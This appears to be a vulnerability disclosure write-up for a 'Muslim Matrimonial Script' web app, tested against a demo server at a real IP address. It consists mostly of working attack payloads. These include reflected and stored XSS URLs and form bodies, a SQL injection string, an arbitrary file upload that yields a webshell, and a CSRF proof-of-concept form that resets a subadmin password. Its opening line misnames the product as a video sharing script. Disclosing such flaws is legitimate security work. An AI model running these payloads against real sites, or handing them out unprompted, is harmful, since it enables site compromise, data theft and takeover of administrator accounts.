### Muslim Matrimonial Script- the lastest version - SQL Injection/Stored-XSS/Reflect-XSS/Arbitrary-File-Uploading/CSRF

Well,  when I pentest the official demo site of Readymade Video Sharing Script, I found some vulnerabilities here.


#### XSS:

##### Reflect-XSS

##### XSS1

```
http://74.124.215.220/~projclient/client/muslim-matrimony/admin/event_edit.php?edit_id=17%27%22%3E123%3Cimg%20src=x%20onerror=console.log(/xss/)%3E123%3C%27%22
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Muslim-Matrimonial-Script/xss1.png)

##### XSS2

```
http://74.124.215.220/~projclient/client/muslim-matrimony/admin/slider_edit.php?edit_id=1%27%22%3E123%3Cimg%20src=x%20onerror=console.log(/xss2/)%3E123%3C%27%22
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Muslim-Matrimonial-Script/xss2.png)

##### XSS3

```
http://74.124.215.220/~projclient/client/muslim-matrimony/admin/state_view.php?cou_id=%27%22%3E123%3Cimg%20src=x%20onerror=console.log(/xss3/)%3E123%3C%27%22
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Muslim-Matrimonial-Script/xss3.png)

##### XSS4

```
http://74.124.215.220/~projclient/client/muslim-matrimony/admin/caste_view.php?comm_id=46%27%22%3E123%3Cimg%20src=x%20onerror=console.log(/xss4/)%3E123%3C%27%22
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Muslim-Matrimonial-Script/xss4.png)


##### Stored-XSS


```
http://74.124.215.220/~projclient/client/muslim-matrimony/admin/event_add.php
```

POST parameters:

```
------WebKitFormBoundarypSOX4YzB8lLca9QI
Content-Disposition: form-data; name="event_title"

test'"><svg/onload=alert(/xss/)><'"
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Muslim-Matrimonial-Script/sxss.png)


#### SQL Injection:

##### sqli

The original parameter:
```
http://74.124.215.220/~projclient/client/muslim-matrimony/view-rofile.php?mem_id=NDk=
```

BaseDecode the parameter, and add payload:

```
http://74.124.215.220/~projclient/client/muslim-matrimony/view-rofile.php?mem_id=49' AND 6882=6882 AND 'qpug'='qpug
```

Then we can use the tamper script to attack the weak link.


![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Muslim-Matrimonial-Script/sqli.png)


#### Arbitrary-File-Uploading

There is an arbitrary-file-uploading, we can upload any type files with evil content.

Weak url:
```
http://74.124.215.220/~projclient/client/muslim-matrimony/admin/mydetails_edit.php?u_id=xxx
```

Post parameter:
```
------WebKitFormBoundary6LBE6fQ0BdnKYrgo
Content-Disposition: form-data; name="user_photo"; filename="xxx.xxx"
Content-Type: application/octet-stream

evil-content
```



Then we'll get a evil file here:

```
http://74.124.215.220/~projclient/client/muslim-matrimony/uploads/xxx.xxx
```

Run command in the webshell:
![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Muslim-Matrimonial-Script/upload1.png)

Operate the folders and files through the webshell:
![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Muslim-Matrimonial-Script/upload2.png)



#### CSRF

We can use csrf attack to cheat the user to change sensitive settings in the user panel, even change the password or insert evil content into it.

poc:

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://74.124.215.220/~projclient/client/muslim-matrimony/admin/subadmin_edit.php?edit_id=9999" method="POST">
      <input type="hidden" name="sub&#95;id" value="9999" />
      <input type="hidden" name="name" value="test123" />
      <input type="hidden" name="email" value="parguinet&#64;gmail&#46;com" />
      <input type="hidden" name="pass" value="666" />
      <input type="hidden" name="cpass" value="666" />
      <input type="hidden" name="submit" value="Update" />
      <input type="submit" value="Submit request" />
    </form>
  </body>


```

This vulnerability does not need evil attacker to login into the user panel.

